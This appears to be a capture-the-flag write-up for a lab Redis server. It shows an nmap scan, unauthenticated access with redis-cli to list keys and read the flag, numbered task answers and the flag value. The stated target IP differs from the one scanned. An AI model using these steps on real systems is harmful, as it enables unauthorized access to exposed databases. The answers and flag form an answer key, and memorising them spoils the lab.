# Target Info
Target Machine IP = 10.129.192.110

# Solution
1. run nmap scan, 6379
```
○ sudo nmap -p 1-10000 -sV -T5 10.129.30.220
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-21 20:38 WIB
Warning: 10.129.30.220 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.30.220
Host is up (0.65s latency).
Not shown: 9926 closed ports, 73 filtered ports
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 225.06 seconds
```
2. redis
3. in-memory Database
4. redis-cli
5. -h
6. info
7. 5.0.7
8. select
9. open redis-cli and get the keys, 4 
```
○ redis-cli -h 10.129.30.220
10.129.30.220:6379> keys '*'
1) "flag"
2) "temp"
3) "stor"
4) "numb"
(0.92s)
10.129.30.220:6379>
```
10. get flag
```
10.129.30.220:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
(0.53s)
```

flag = 03e1d2b376c37ab3f5319922053953eb
